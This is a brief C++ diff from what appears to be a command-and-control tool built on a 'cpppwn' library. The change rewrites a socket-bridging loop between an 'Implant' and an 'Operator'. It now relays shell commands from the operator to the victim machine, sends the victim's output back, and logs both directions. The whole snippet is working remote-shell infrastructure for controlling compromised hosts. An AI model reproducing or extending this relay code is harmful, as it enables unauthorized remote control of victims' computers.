@@ -92,13 +92,17 @@ public:
     //--------------------------------
     void bridge_sockets(std::unique_ptr<cpppwn::Remote>&& a_ptr, std::unique_ptr<cpppwn::Remote>&& b_ptr) {
         //
-        std::thread([a = std::move(a_ptr), b = std::move(b_ptr)]() -> void {
+        std::thread([vic = std::move(a_ptr), op = std::move(b_ptr)]() -> void {
             logger::success("Bridging established between Implant and Operator.");
 
-            while (a->is_alive() && b->is_alive()) {
-                // Check if data exists to avoid blocking indefinitely in some pwn libs
-                b->send(a->recvall());
-                a->send(b->recvall());
+            while (vic->is_alive() && op->is_alive()) {
+                const auto cmd = trim_string(op->recvline());
+                logger::debug("Shell Command From Operator: [{}]", cmd);
+                vic->sendline(cmd);
+
+                const auto output = trim_string(vic->recvline());
+                logger::debug("Output from Victim: [{}]", output);
+                op->sendline(output);
 
                 std::this_thread::sleep_for(std::chrono::milliseconds(5));
             }
